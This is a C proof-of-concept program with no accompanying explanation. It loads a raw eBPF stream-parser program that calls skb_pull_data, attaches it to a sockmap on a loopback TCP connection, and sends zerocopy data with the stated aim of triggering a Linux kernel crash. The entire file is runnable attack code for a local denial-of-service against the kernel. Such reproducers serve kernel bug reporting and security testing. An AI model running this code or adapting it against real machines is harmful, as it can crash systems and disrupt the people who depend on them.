#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#ifndef BPF_FUNC_skb_pull_data
#define BPF_FUNC_skb_pull_data 39
#endif

#ifndef SO_ZEROCOPY
#define SO_ZEROCOPY 60
#endif

struct bpf_insn_raw {
	__u8	code;
	__u8	dst_reg:4;
	__u8	src_reg:4;
	__s16	off;
	__s32	imm;
};

int bpf(int cmd, union bpf_attr *attr) {
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

int main() {
    struct bpf_insn_raw insns[] = {
        { .code = 0xb7, .dst_reg = 2, .imm = 10 },
        { .code = 0x85, .imm = 39 },
        { .code = 0xb7, .dst_reg = 0, .imm = 0 },
        { .code = 0x95 }
    };

    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SK_SKB;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = sizeof(insns) / sizeof(insns[0]);
    attr.license = (unsigned long)"GPL";

    int prog_fd = bpf(BPF_PROG_LOAD, &attr);
    if (prog_fd < 0) { perror("bpf(BPF_PROG_LOAD)"); return 1; }

    int map_fd = bpf(BPF_MAP_CREATE, &(union bpf_attr){
        .map_type = BPF_MAP_TYPE_SOCKMAP,
        .key_size = 4,
        .value_size = 4,
        .max_entries = 2,
    });
    if (map_fd < 0) { perror("bpf(BPF_MAP_CREATE)"); return 1; }

    if (bpf(BPF_PROG_ATTACH, &(union bpf_attr){
        .target_fd = map_fd,
        .attach_bpf_fd = prog_fd,
        .attach_type = BPF_SK_SKB_STREAM_PARSER,
    }) < 0) { perror("bpf(BPF_PROG_ATTACH)"); return 1; }

    int s = socket(AF_INET, SOCK_STREAM, 0);
    int l = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(12345), .sin_addr.s_addr = inet_addr("127.0.0.1") };
    
    int opt = 1;
    setsockopt(l, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    bind(l, (struct sockaddr *)&addr, sizeof(addr));
    listen(l, 1);
    
    if (fork() == 0) {
        int c = accept(l, NULL, NULL);
        int key = 0;
        bpf(BPF_MAP_UPDATE_ELEM, &(union bpf_attr){
            .map_fd = map_fd,
            .key = (unsigned long)&key,
            .value = (unsigned long)&c,
        });
        char buf[1024];
        while(read(c, buf, sizeof(buf)) > 0);
        exit(0);
    }

    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_ZEROCOPY, &opt, sizeof(opt)) < 0) {
        perror("setsockopt(SO_ZEROCOPY)");
    }

    printf("PoC setup complete. Sending data to trigger crash...\n");

    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(page, 'A', 4096);

    struct iovec iov = { .iov_base = page, .iov_len = 100 };
    struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1 };

    if (sendmsg(s, &msg, MSG_ZEROCOPY) < 0) {
        perror("sendmsg");
    }

    printf("Data sent. Waiting...\n");
    sleep(2);
    printf("Kernel did not crash.\n");

    return 0;
}
